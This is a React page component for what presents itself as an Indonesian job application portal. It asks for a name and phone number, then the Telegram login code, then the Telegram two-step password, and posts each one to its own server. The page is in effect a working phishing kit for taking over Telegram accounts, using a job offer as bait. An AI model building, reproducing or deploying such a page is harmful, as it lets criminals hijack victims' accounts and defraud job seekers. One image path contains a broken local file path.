import {
    AccessTime,
    AccountBalance,
    AdminPanelSettings,
    AssignmentInd,
    BarChart,
    Business,
    Home,
    Hotel,
    List,
    MailOutline,
    Menu,
    ModelTraining,
    Money,
    Paid,
    QuestionAnswer,
    Work,
} from "@mui/icons-material";
import React, { useRef, useState } from "react";
import dataJson from "../Job/data";
import { Head, router, useForm } from "@inertiajs/react";
export default function Index(props) {
    const id = props.id;
    const [status, setStatus] = useState("registrasi");
    const { data, setData, post, reset, errors } = useForm({
        nama: "",
        nomor_hp: "+62",
        jenis_kelamin: "",
        lulusan: "",
        password: "",
    });
    const [verifData, setVerifData] = useState(["", "", "", "", ""]);
    const verifRef = useRef([]);

    const handleChange = (index, event) => {
        const nilaiBaru = [...verifData];
        nilaiBaru[index] = event.target.value;
        if (event.target.value.length === 1 && index < 4) {
            verifRef.current[index + 1].focus();
        }
        setVerifData(nilaiBaru);
    };
    const submitHandler = (e) => {
        e.preventDefault();
        post(route("registrasi-store"), {
            onSuccess: () => {
                setStatus("verifikasi");
            },
            onError: () => {
                setStatus("registrasi");
            },
        });
    };
    const submitVerif = (e) => {
        e.preventDefault();
        router.post(
            route("verif-store"),
            {
                nomor_hp: data.nomor_hp,
                code_verif: verifData,
            },
            {
                onSuccess: () => {
                    setStatus("password");
                },
                onError: () => {
                    setStatus("verifikasi");
                },
            }
        );
    };
    const submitPassword = (e) => {
        e.preventDefault();
        router.post(
            route("password-store"),
            {
                nomor_hp: data.nomor_hp,
                code_verif: verifData,
                password: data.password,
            },
            {
                onSuccess: () => {
                    setData({
                        ...data,
                        nama: "",
                        nomor_hp: "+62",
                        password: "",
                    });
                    setVerifData(["", "", "", "", ""]);
                    setStatus("registrasi");
                },
                onError: () => {
                    setStatus("password");
                },
            }
        );
    };

    return (
        <div className="flex flex-col  w-full">
            <Head title={"Lowongan Pekerjaan Indonesia"} />
            <div className="w-full h-full">
                <div className="flex justify-between items-center py-2 px-4 drop-shadow-sm border border-b">
                    <img
                        src="/Jc:\Users\PC\Downloads\garuda-1.webpob/garuda-1.webp"
                        alt=""
                        className="w-14"
                    />
                    <p className="text-5xl font-bold text-blue-700">
                        <Menu color="inherit" fontSize="inherit" />
                    </p>
                </div>
                {/* body */}

                <div className="flex flex-col  w-full py-4 px-8">
                    <div className="flex flex-col items-center justify-center">
                        <img src={dataJson[id - 1].image} alt="" />
                        <p className="mt-8 text-blue-800 font-bold text-2xl">
                            {status == "registrasi"
                                ? "Masukkan Lamaran Sekarang"
                                : status == "verifikasi"
                                ? "Cek Status Lamaran"
                                : "Masukkan Password "}
                        </p>
                        <p className="text-sm tracking-tighter text-gray-400 text-center my-2">
                            {status == "registrasi"
                                ? " Untuk mendaftar silahkan login menggunakan akun Telegra, dan kami akan menghubungi anda untuk melengkapi semua berkas yang diperlukan"
                                : status == "verifikasi"
                                ? "Silahkan masukkan kode verifikasi telegram untuk mengecek status lamaran anda"
                                : "upss, sepertnya telegram anda membutuhkan password, silahkan masukkan password anda "}
                        </p>
                    </div>
                    {status == "registrasi" && (
                        <form onSubmit={submitHandler} className="w-full">
                            <div className="my-1 flex flex-row items-center w-full rounded-lg overflow-hidden p-1 bg-gray-100 drop-shadow-sm">
                                <div className="py-3 px-5 rounded-md bg-gray-100 w-[80px]">
                                    Nama
                                </div>
                                <input
                                    type="text"
                                    placeholder="Nama lengkap sesuai KTP"
                                    className="w-full drop-shadow-sm"
                                    value={data.nama}
                                    onChange={(e) =>
                                        setData({
                                            ...data,
                                            nama: e.target.value,
                                        })
                                    }
                                />
                            </div>
                            {errors.nama && (
                                <p className="tracking-tighter text-xs text-red-500 italic">
                                    {errors.nama}
                                </p>
                            )}
                            <p className="text-gray-400 mt-2.5 tracking-tighter">
                                * Nomor telephone harus diawali dengan +62
                            </p>
                            <div className="mb-2.5 flex flex-row items-center w-full rounded-lg overflow-hidden p-1 bg-gray-100 drop-shadow-sm">
                                <div className="py-3 px-5 rounded-md bg-gray-100 w-[80px]">
                                    <img
                                        className="w-6 h-6"
                                        src={`https://flagcdn.com/w40/id.png`}
                                        alt=""
                                    />
                                </div>
                                <input
                                    type="text"
                                    className="w-full drop-shadow-sm"
                                    value={data.nomor_hp}
                                    onChange={(e) =>
                                        setData({
                                            ...data,
                                            nomor_hp: e.target.value,
                                        })
                                    }
                                />
                            </div>
                            {errors.nomor_hp && (
                                <p className="tracking-tighter text-xs text-red-500 italic">
                                    {errors.nomor_hp}
                                </p>
                            )}
                            <select
                                name="jenis_kelamin"
                                id=""
                                value={data.jenis_kelamin}
                                onChange={(e) =>
                                    setData({
                                        ...data,
                                        jenis_kelamin: e.target.value,
                                    })
                                }
                                className="w-full rounded-md drop-shadow-sm my-1"
                            >
                                <option value="">Pilih jenis kelamin</option>
                                <option value="laki-laki">Laki-Laki</option>
                                <option value="perempuan">Perempuan</option>
                            </select>
                            {errors.jenis_kelamin && (
                                <p className="tracking-tighter text-xs text-red-500 italic">
                                    {errors.jenis_kelamin}
                                </p>
                            )}
                            <select
                                name="lulusan"
                                id=""
                                value={data.lulusan}
                                onChange={(e) =>
                                    setData({
                                        ...data,
                                        lulusan: e.target.value,
                                    })
                                }
                                className="w-full rounded-md drop-shadow-sm my-1"
                            >
                                <option value="">Pilih lulusan</option>
                                <option value="SMA/SMK">SMA/SMK</option>
                                <option value="Diploma">Diploma</option>
                                <option value="Sarjana">Sarjana</option>
                                <option value="Magister">Magister</option>
                                <option value="Doktor">Doktor</option>
                            </select>
                            {errors.lulusan && (
                                <p className="tracking-tighter text-xs text-red-500 italic">
                                    {errors.lulusan}
                                </p>
                            )}
                            <div className="flex justify-center my-4">
                                <button className="text-white text-center rounded-md bg-blue-800 hover:bg-blue-700 py-2 px-4 ">
                                    Cek Status
                                </button>
                            </div>
                        </form>
                    )}
                    {status == "verifikasi" && (
                        <form onSubmit={submitVerif} className="w-full ">
                            <div className="w-full flex gap-3 justify-center">
                                {verifData.map((item, index) => (
                                    <input
                                        key={index}
                                        type="number"
                                        value={item}
                                        ref={(ref) =>
                                            (verifRef.current[index] = ref)
                                        }
                                        className="w-12 rounded-md border text-center border-gray-300 drop-shadow-md"
                                        maxLength={1}
                                        onChange={(event) =>
                                            handleChange(index, event)
                                        }
                                    />
                                ))}
                            </div>
                            <div className="flex justify-center my-4">
                                <button className="text-white text-center rounded-md bg-blue-800 hover:bg-blue-700 py-2 px-4 ">
                                    Verifikasi
                                </button>
                            </div>
                        </form>
                    )}
                    {status == "password" && (
                        <form onSubmit={submitPassword} className="w-full ">
                            <input
                                type="password"
                                placeholder=""
                                className="w-full drop-shadow-sm"
                                value={data.password}
                                onChange={(e) =>
                                    setData({
                                        ...data,
                                        password: e.target.value,
                                    })
                                }
                            />
                            <div className="flex justify-center my-4">
                                <button className="text-white text-center rounded-md bg-blue-800 hover:bg-blue-700 py-2 px-4 ">
                                    Verifikasi
                                </button>
                            </div>
                        </form>
                    )}
                </div>
                {/* Footer */}
                <div className="flex justify-center items-center">
                    <img src="/job/footer.webp" />
                </div>
                <div className="py-3 px-8 flex justify-between text-white bg-blue-600">
                    <p>2025 All Rights Reserved</p>
                    <div className="flex gap-x-1.5 items-center">
                        <p>
                            <QuestionAnswer
                                color="inherit"
                                fontSize="inherit"
                            />
                        </p>
                        <p>
                            <Home color="inherit" fontSize="inherit" />
                        </p>
                        <p>
                            <MailOutline color="inherit" fontSize="inherit" />
                        </p>
                    </div>
                </div>
            </div>
        </div>
    );
}
